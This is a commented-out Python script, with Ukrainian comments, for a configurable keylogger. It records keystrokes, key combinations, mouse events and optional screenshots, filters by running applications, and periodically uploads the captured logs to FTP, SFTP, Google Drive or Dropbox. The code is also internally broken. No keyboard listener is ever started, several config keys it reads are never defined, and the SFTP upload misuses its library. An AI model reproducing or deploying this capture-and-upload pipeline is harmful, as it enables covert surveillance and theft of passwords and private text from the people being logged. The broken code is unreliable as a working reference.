# import json
# import os
# import logging
# from logging.handlers import RotatingFileHandler
# from datetime import datetime
# from pathlib import Path
# import time
# import matplotlib.pyplot as plt
# import cv2
# import numpy as np
# from PIL import ImageGrab
# from pynput import keyboard, mouse
# import tkinter as tk
# from tkinter import simpledialog, filedialog
# import sqlite3
# import psycopg2
# import paramiko
# import dropbox
# import httpx
# from flask import Flask, jsonify, request
# from watchdog.observers import Observer
# from watchdog.events import FileSystemEventHandler
#
# # Глобальна змінна для конфігурації
# config = {}
#
# # Функція для створення файлу config.json з параметрами за замовчуванням
# def create_default_config():
#     default_config = {
#         "log_directory": "logs",
#         "log_file": "app.log",
#         "backup_interval": 3600,
#         "session_duration": 3600,
#         "delay_between_records": 1,
#         "log_time": True,
#         "time_format": "%Y-%m-%d %H:%M:%S",
#         "log_special_keys": True,
#         "log_key_combinations": True,
#         "log_to_console": True,
#         "screenshot_on_log": False,
#         "screen_capture_directory": "screenshots",
#         "analysis_directory": "analysis",
#         "data_analysis": True,
#         "interactive_mode": False,
#         "application_filter": [],
#         "resource_monitoring": False,
#         "mouse_logging": False,
#         "db_logging": False,
#         "db_type": "sqlite",
#         "db_path": "app.db",
#         "db_table": "logs",
#         "web_interface": False,
#         "external_api_integration": False,
#         "api_endpoints": [],
#         "toggle_key": "ctrl+alt",
#         "exclude_keys": []
#     }
#
#     with open('config.json', 'w') as config_file:
#         json.dump(default_config, config_file, indent=4)
#     print("Створено файл config.json з параметрами за замовчуванням.")
#
# # Функція для завантаження конфігурації
# def load_config():
#     global config
#     config_file = 'config.json'
#     if not os.path.exists(config_file):
#         create_default_config()
#     with open(config_file, 'r') as file:
#         config = json.load(file)
#
# def setup_logging():
#     global config
#     if 'log_directory' not in config or 'log_file' not in config:
#         raise ValueError("Config must contain 'log_directory' and 'log_file' fields.")
#
#     log_dir = config['log_directory']
#     if not os.path.exists(log_dir):
#         os.makedirs(log_dir)
#
#     log_file = os.path.join(log_dir, config['log_file'])
#
#     logger = logging.getLogger()
#     logger.setLevel(logging.DEBUG)
#
#     handler = RotatingFileHandler(log_file, maxBytes=1024 * 1024 * 5, backupCount=5)
#     formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
#     handler.setFormatter(formatter)
#
#     logger.addHandler(handler)
#
# def backup_logs():
#     global config
#     log_dir = config['log_directory']
#
#     if config.get('network_storage'):
#         network_storage = config['network_storage']
#         if network_storage.startswith('ftp://'):
#             import ftplib
#             ftp = ftplib.FTP(network_storage[6:])
#             ftp.login()
#             for filename in os.listdir(log_dir):
#                 if filename.endswith('.txt'):
#                     with open(os.path.join(log_dir, filename), 'rb') as file:
#                         ftp.storbinary(f'STOR {filename}', file)
#         elif network_storage.startswith('sftp://'):
#             import paramiko
#             transport = paramiko.SFTPClient.from_transport(paramiko.Transport(network_storage[7:]))
#             for filename in os.listdir(log_dir):
#                 if filename.endswith('.txt'):
#                     transport.put(os.path.join(log_dir, filename), filename)
#         elif network_storage.startswith('google_drive://'):
#             from googleapiclient.discovery import build
#             from googleapiclient.http import MediaFileUpload
#             drive_service = build('drive', 'v3', developerKey=config['api_key'])
#             for filename in os.listdir(log_dir):
#                 if filename.endswith('.txt'):
#                     media = MediaFileUpload(os.path.join(log_dir, filename))
#                     drive_service.files().create(body={'name': filename}, media_body=media).execute()
#         elif network_storage.startswith('dropbox://'):
#             dbx = dropbox.Dropbox(config['api_key'])
#             for filename in os.listdir(log_dir):
#                 if filename.endswith('.txt'):
#                     with open(os.path.join(log_dir, filename), 'rb') as file:
#                         dbx.files_upload(file.read(), f'/{filename}')
#     else:
#         backup_path = os.path.join(log_dir, 'backup')
#         if not os.path.exists(backup_path):
#             os.makedirs(backup_path)
#         for filename in os.listdir(log_dir):
#             if filename.endswith('.txt'):
#                 import shutil
#                 shutil.copy(os.path.join(log_dir, filename), os.path.join(backup_path, filename))
#
# def monitor_log_changes():
#     class LogFileHandler(FileSystemEventHandler):
#         def on_modified(self, event):
#             if event.src_path.endswith(config['log_file']):
#                 analyze_data()
#
#     event_handler = LogFileHandler()
#     observer = Observer()
#     observer.schedule(event_handler, path=config['log_directory'], recursive=False)
#     observer.start()
#     try:
#         while True:
#             time.sleep(1)
#     except KeyboardInterrupt:
#         observer.stop()
#     observer.join()
#
# def analyze_data():
#     if config['data_analysis']:
#         log_path = os.path.join(config['log_directory'], config['log_file'])
#         if os.path.exists(log_path):
#             with open(log_path, 'r') as file:
#                 data = file.readlines()
#
#             key_counts = {}
#             for line in data:
#                 if 'COMBO' in line:
#                     continue
#                 key = line.split(' ')[-1].strip()
#                 key_counts[key] = key_counts.get(key, 0) + 1
#
#             analysis_dir = config['analysis_directory']
#             if not os.path.exists(analysis_dir):
#                 os.makedirs(analysis_dir)
#
#             plt.figure(figsize=(10, 6))
#             plt.bar(key_counts.keys(), key_counts.values())
#             plt.xlabel('Keys')
#             plt.ylabel('Frequency')
#             plt.title('Key Press Frequency Analysis')
#             plt.xticks(rotation=90)
#             plt.tight_layout()
#             plt.savefig(os.path.join(analysis_dir, f"{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.png"))
#             plt.close()
#
# def show_gui():
#     root = tk.Tk()
#     root.withdraw()
#
#     if config['interactive_mode']:
#         while True:
#             action = simpledialog.askstring("Action", "What would you like to do? (start/stop/exit)")
#             if action == "start":
#                 global recording
#                 recording = True
#                 print("Recording started.")
#             elif action == "stop":
#                 recording = False
#                 print("Recording stopped.")
#             elif action == "exit":
#                 break
#
# def on_press(key):
#     global pressed_keys
#     global recording
#     global buffer
#     global last_backup_time
#
#     if not recording or not is_app_allowed():
#         return
#
#     check_resource_usage()
#
#     if config['session_duration'] > 0 and (time.time() - session_start_time) > config['session_duration']:
#         return False
#
#     if config['delay_between_records'] > 0 and (time.time() - last_record_time) < config['delay_between_records']:
#         return
#
#     if (time.time() - last_backup_time) > config['backup_interval']:
#         backup_logs()
#         last_backup_time = time.time()
#
#     current_time = format_time() if config['log_time'] else ''
#
#     try:
#         key_char = key.char
#     except AttributeError:
#         if not config['log_special_keys']:
#             return
#         key_char = f'[{key}]'
#
#     if key_char and (not config['key_filter'] or key_char in config['key_filter']) and key_char not in config[
#         'exclude_keys']:
#         log_entry = config['log_format'].format(time=current_time, key=key_char) if current_time else key_char
#         buffer.append(log_entry)
#
#         if len(buffer) > 0:
#             write_log_entry(buffer.pop(0))
#
#         if config['log_to_console']:
#             print(log_entry)
#
#         if config['screenshot_on_log']:
#             if not os.path.exists(config['screen_capture_directory']):
#                 os.makedirs(config['screen_capture_directory'])
#             take_screenshot()
#
#     if config['log_key_combinations'] and len(pressed_keys) > 1:
#         combo = '+'.join(sorted([str(k) for k in pressed_keys]))
#         log_entry = f'{format_time()} COMBO: {combo}' if config['log_time'] else f'COMBO: {combo}'
#         buffer.append(log_entry)
#         if len(buffer) > 0:
#             write_log_entry(buffer.pop(0))
#
#         if config['log_to_console']:
#             print(log_entry)
#
# def on_release(key):
#     global pressed_keys
#     global recording
#
#     if key in pressed_keys:
#         pressed_keys.remove(key)
#
#     if key == keyboard.Key.esc:
#         return False
#
#     toggle_key_combination = config['toggle_key'].split('+')
#     toggle_keys = set([keyboard.Key[tk.strip().lower()] for tk in toggle_key_combination])
#
#     if all(k in toggle_keys for k in pressed_keys):
#         recording = not recording
#         print(f"Запис: {'УВІМКНУТО' if recording else 'ВИМКНУТО'}")
#
# def on_click(x, y, button, pressed):
#     log_mouse_event(x, y, button, pressed)
#
# def on_scroll(x, y, dx, dy):
#     if config['mouse_logging']:
#         log_entry = f"{format_time()} MOUSE SCROLL at ({x}, {y}) by ({dx}, {dy})"
#         write_log_entry(log_entry)
#
# def log_mouse_event(x, y, button, pressed):
#     if config['mouse_logging']:
#         log_entry = f"{format_time()} MOUSE {'PRESSED' if pressed else 'RELEASED'} at ({x}, {y})"
#         write_log_entry(log_entry)
#
# def is_app_allowed():
#     if not config['application_filter']:
#         return True
#     try:
#         import psutil
#         for proc in psutil.process_iter(['name']):
#             if proc.info['name'].lower() in [app.lower() for app in config['application_filter']]:
#                 return True
#     except ImportError:
#         pass
#     return False
#
# def check_resource_usage():
#     if config['resource_monitoring']:
#         import psutil
#         cpu_usage = psutil.cpu_percent(interval=1)
#         memory_info = psutil.virtual_memory()
#         log_entry = f"Resource Usage - CPU: {cpu_usage}% Memory: {memory_info.percent}%"
#         write_log_entry(log_entry)
#
# def format_time():
#     if config.get('log_time'):
#         return datetime.now().strftime(config.get('time_format', '%Y-%m-%d %H:%M:%S'))
#     return ''
#
# def write_log_entry(entry):
#     with open(config['log_file_path'], 'a') as log_file:
#         log_file.write(entry + '\n')
#
# def take_screenshot():
#     screenshot = ImageGrab.grab()
#     screenshot.save(os.path.join(config['screen_capture_directory'],
#                                  f"screenshot_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.png"))
#
# def show_web_interface():
#     app = Flask(__name__)
#
#     @app.route('/status', methods=['GET'])
#     def get_status():
#         return jsonify({"status": "running"})
#
#     app.run(host='0.0.0.0', port=5000)
#
# def on_external_api_event():
#     for endpoint in config['api_endpoints']:
#         response = httpx.get(endpoint)
#         if response.status_code == 200:
#             handle_external_data(response.json())
#
# def handle_external_data(data):
#     pass
#
# def start_logging():
#     load_config()
#     setup_logging()
#     if config.get('db_logging'):
#         setup_database_logging()
#     if config.get('interactive_mode'):
#         show_gui()
#     if config.get('video_recording'):
#         import cv2
#     if config.get('activity_detection'):
#         monitor_log_changes()
#     if config.get('web_interface'):
#         show_web_interface()
#     if config.get('external_api_integration'):
#         on_external_api_event()
#
# def setup_database_logging():
#     global db_connection
#     if config['db_type'] == 'sqlite':
#         db_connection = sqlite3.connect(config['db_path'])
#     elif config['db_type'] == 'postgresql':
#         db_connection = psycopg2.connect(
#             host=config['db_host'],
#             port=config['db_port'],
#             user=config['db_user'],
#             password=config['db_password']
#         )
#     create_table_if_not_exists()
#
# def create_table_if_not_exists():
#     if config['db_type'] == 'sqlite':
#         with db_connection:
#             db_connection.execute(f"""
#                 CREATE TABLE IF NOT EXISTS {config['db_table']} (
#                     id INTEGER PRIMARY KEY AUTOINCREMENT,
#                     entry TEXT,
#                     timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
#                 )
#             """)
#     elif config['db_type'] == 'postgresql':
#         with db_connection.cursor() as cursor:
#             cursor.execute(f"""
#                 CREATE TABLE IF NOT EXISTS {config['db_table']} (
#                     id SERIAL PRIMARY KEY,
#                     entry TEXT,
#                     timestamp TIMESTAMPTZ DEFAULT CURRENT_TIMESTAMP
#                 )
#             """)
#             db_connection.commit()
#
# def log_to_database(entry):
#     if config.get('db_logging'):
#         if config['db_type'] == 'sqlite':
#             with db_connection:
#                 db_connection.execute(f"INSERT INTO {config['db_table']} (entry) VALUES (?)", (entry,))
#         elif config['db_type'] == 'postgresql':
#             with db_connection.cursor() as cursor:
#                 cursor.execute(f"INSERT INTO {config['db_table']} (entry) VALUES (%s)", (entry,))
#                 db_connection.commit()
#
# # Глобальні змінні
# pressed_keys = set()
# recording = False
# buffer = []
# last_backup_time = time.time()
# session_start_time = time.time()
# last_record_time = time.time()
#
# if __name__ == "__main__":
#     start_logging()
